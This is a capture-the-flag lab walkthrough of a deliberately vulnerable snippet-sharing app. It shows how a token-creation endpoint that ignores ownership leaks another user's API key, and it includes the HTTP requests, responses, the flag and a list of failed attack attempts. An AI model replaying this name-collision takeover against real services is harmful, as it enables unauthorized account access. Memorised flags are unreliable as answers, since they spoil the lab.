# copypasta-008 - BugForge Lab Walkthrough

**URL:** https://lab-1781557282282-pyj5pn.labs-app.bugforge.io/  
**Difficulty:** Easy  
**Vulnerability:** API Token Name Collision → Cross-User Token Disclosure → ATO  
**Flag:** `bug{nyGtLsrVftl8nXDLSbIC6H1LUiGKwn7H}`

---

## Summary

CopyPasta is a code-snippet sharing SaaS with a personal API token system. Users create named tokens (e.g. `"ci"`) and send them in the `X-API-Key` header. The `POST /api/tokens` endpoint looks up existing tokens by name **without scoping to the current user** - if the name already exists for any user, the server returns their full token value instead of creating a new one. By creating a token with the same name as another user's token, an attacker receives the victim's live API credential and can authenticate as them.

## Tech Stack

- React SPA (CRA), JWT in localStorage
- Express.js (Node.js), SQLite
- JWT auth (`Authorization: Bearer`) + API key auth (`X-API-Key: cp_...`)
- Multi-user snippet/collection/token management

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Fields: `username`, `email`, `password`, `full_name` |
| `/api/login` | POST | No | Returns JWT |
| `/api/verify-token` | GET | JWT or X-API-Key | Returns user object; flag is here |
| `/api/tokens` | GET | JWT or X-API-Key | Lists own tokens (prefix only) |
| `/api/tokens` | POST | JWT or X-API-Key | **Vulnerable** - creates or leaks by name |
| `/api/tokens/:id` | DELETE | JWT or X-API-Key | Deletes own token by ID |
| `/api/snippets/public` | GET | JWT | Public snippet feed |
| `/api/profile/:username` | GET | JWT | User profile + public snippets |

## Vulnerability

`POST /api/tokens` resolves the submitted name against the global tokens table:

```sql
-- What the server does (vulnerable)
SELECT * FROM tokens WHERE name = ?

-- What it should do
SELECT * FROM tokens WHERE name = ? AND user_id = ?
```

If a match is found, the existing token's full value is returned to the requester - regardless of who owns it. The token name `"ci"` is predictable because the app's own example script (shown to users) demonstrates using that exact name on every machine.

## Attack Chain

### Step 1 - Register an account

```
POST /api/register HTTP/1.1
Host: lab-1781557282282-pyj5pn.labs-app.bugforge.io
Content-Type: application/json

{"username":"attacker_demo","email":"attacker_demo@test.com","password":"Password123!","full_name":"Attacker"}
```

Response:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NiwidXNlcm5hbWUiOiJhdHRhY2tlcjEiLCJpYXQiOjE3ODE1NTczNTN9.0S9xmN4SRH5dR9GW8QVLWfqnciSbFpmLZMTU-jy74eE",
  "user": {"id": 6, "username": "attacker1", "role": "user"}
}
```

### Step 2 - Create a token named "ci" (triggers the collision)

```
POST /api/tokens HTTP/1.1
Host: lab-1781557282282-pyj5pn.labs-app.bugforge.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NiwidXNlcm5hbWUiOiJhdHRhY2tlcjEiLCJpYXQiOjE3ODE1NTczNTN9.0S9xmN4SRH5dR9GW8QVLWfqnciSbFpmLZMTU-jy74eE
Content-Type: application/json

{"name":"ci"}
```

Response (server returns `coder123`'s existing "ci" token, not a new one):
```json
{
  "id": 7,
  "name": "ci",
  "token": "cp_b1295755f517f9846e408a959ad61b6bdfa1574331ef941e",
  "token_prefix": "cp_b1295755",
  "message": "API token created. Copy it now - it will not be shown again."
}
```

The `id: 7` is the attacker's new row, but the `token` value belongs to `coder123` (user_id 2). The server found the existing "ci" token first and returned its value.

### Step 3 - Authenticate as the victim

```
GET /api/verify-token HTTP/1.1
Host: lab-1781557282282-pyj5pn.labs-app.bugforge.io
X-API-Key: cp_b1295755f517f9846e408a959ad61b6bdfa1574331ef941e
```

Response:
```json
{
  "user": {
    "id": 2,
    "username": "coder123",
    "email": "coder@example.com",
    "full_name": "John Coder",
    "bio": "JavaScript enthusiast and full-stack developer",
    "role": "user"
  },
  "flag": "bug{nyGtLsrVftl8nXDLSbIC6H1LUiGKwn7H}"
}
```

## Discovery Notes

- `quick-triage.py` revealed the `/api/tokens` endpoint in the JS bundle
- The JS bundle showed tokens use the `X-API-Key` header (not `Authorization`)
- Creating `"ci"` returned a token that authenticated as a different user - confirmed cross-user leak

## Dead Ends

| Attempt | Why it failed | Lesson |
|---------|--------------|--------|
| SQLi on login | Input rejected with 400 | Parameterized queries |
| JWT alg:none | 403 on admin endpoint | Signature properly verified |
| IDOR on token IDs (`DELETE /api/tokens/1`) | "Token not found" | Delete is ownership-scoped by ID |
| IDOR on snippet IDs (4, 6) | "Snippet not found" | Private snippets not accessible by ID |
| `GET /api/profile/<numeric_id>` | "User not found" | Profile lookup is by username, not ID |
| Mass assignment `role:admin` on register | Role stayed `user` | Field ignored on write |

## Root Cause

`POST /api/tokens` performs a global name lookup before insertion. The intent was likely to enforce unique token names per user, but the query omits the `user_id` filter, making names globally unique and causing the server to return an existing token when a name collision occurs.

## CWE / OWASP

- **CWE-284**: Improper Access Control (missing ownership scope on token lookup)
- **CWE-200**: Exposure of Sensitive Information to an Unauthorized Actor
- **OWASP A01:2021** - Broken Access Control (IDOR variant)
- **Impact:** Full account takeover of any user with a known or guessable token name
